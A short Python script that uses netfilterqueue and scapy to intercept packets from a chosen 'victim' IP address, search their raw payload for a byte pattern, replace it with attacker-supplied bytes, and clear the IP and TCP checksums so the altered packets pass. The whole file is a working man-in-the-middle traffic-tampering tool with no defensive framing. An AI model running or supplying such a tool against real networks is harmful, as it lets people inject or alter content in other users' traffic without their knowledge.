from netfilterqueue import NetfilterQueue
from scapy.all import *
import argparse

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument("--src", required=True)
parser.add_argument("-f", "--find", required=True)
parser.add_argument("-r", "--replace", required=True)
args = parser.parse_args()

src_ip = args.src
find = args.find.encode()
replace = args.replace.encode()

def process_packet(packet):
    pkt = IP(packet.get_payload())

    # Only packets with data
    if pkt.haslayer(Raw):

        # Only victim's traffic
        if pkt[IP].src == src_ip:

            data = pkt[Raw].load

            if find in data:
                print("[+] Found pattern! Modifying...")

                new_data = data.replace(find, replace)

                pkt[Raw].load = new_data

                # Important: Delete checksums
                del pkt[IP].len
                del pkt[IP].chksum

                if pkt.haslayer(TCP):
                    del pkt[TCP].chksum

                packet.set_payload(bytes(pkt))

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

print("Waiting for packets...")

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Stopping...")